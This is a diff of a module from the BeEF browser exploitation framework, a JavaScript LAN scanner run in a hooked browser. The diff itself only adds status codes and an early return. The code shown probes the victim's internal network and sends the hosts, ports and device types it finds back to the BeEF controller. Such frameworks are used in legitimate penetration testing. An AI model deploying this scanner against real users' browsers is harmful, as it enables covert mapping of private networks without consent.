@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -9,7 +9,8 @@ beef.execute(function() {
 
 	if(!beef.browser.isFF() && !beef.browser.isS()){
 		beef.debug("[command #<%= @command_id %>] Browser is not supported.");
-		beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser");
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
+		return;
 	}
 
 //------------------------------------------------------------------------------------------
@@ -353,12 +354,12 @@ beef.execute(function() {
 	lanScanner.addHost = function(obj) {
 		this.timeout = 0;
 		beef.debug("[JS LAN Scanner] Found "+this.getPortName(obj.port)+" [proto: http, ip: "+obj.host+", port: "+obj.port+"]");
-		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'proto=http&ip='+obj.host+'&port='+obj.port+'&service='+this.getPortName(obj.port));
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'proto=http&ip='+obj.host+'&port='+obj.port+'&service='+this.getPortName(obj.port), beef.are.status_success());
 		lanScanner.fingerPrint(obj.host);
 	}
 	lanScanner.addDevice = function(obj) {
 		beef.debug("[JS LAN Scanner] Found " + obj.make + ' ' + obj.model + ' [ip: ' + obj.host + ']');
-		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'ip='+obj.host+'&device='+obj.make+' '+obj.model);
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'ip='+obj.host+'&device='+obj.make+' '+obj.model, beef.are.status_success());
 	}
 	lanScanner.destroyConnections = function() {
 		var guessesLen = guesses.length;
